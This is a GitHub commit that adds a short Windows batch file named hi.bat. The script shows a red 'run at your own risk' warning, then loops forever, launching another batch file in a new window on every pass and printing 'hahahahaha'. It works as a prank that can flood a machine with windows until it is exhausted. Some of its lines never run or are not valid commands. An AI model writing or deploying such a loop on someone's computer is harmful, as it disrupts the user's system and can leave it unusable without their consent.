c03eb127131abebcbb9e5afea3e3b17ad74b9ecd
RustyWarShips <51161212+RustyWarShips@users.noreply.github.com>
2019-05-29 13:05:51 +0100

    Add files via upload

---
+++ hi.bat
@@ -0,0 +1,19 @@
+@echo off
+:s
+color 04
+echo =====================================================
+color 40
+echo :WARNING:YOU HAVE RAN THIS PROGRAM AT YOUR OWN RISK!
+color 04
+echo =====================================================
+color 40
+start help.bat
+
+wait 
+echo hahahahaha
+
+goto s
+start hi.bat
+
+
+cd C:\Users\maximus\Desktop\cuber.jpg
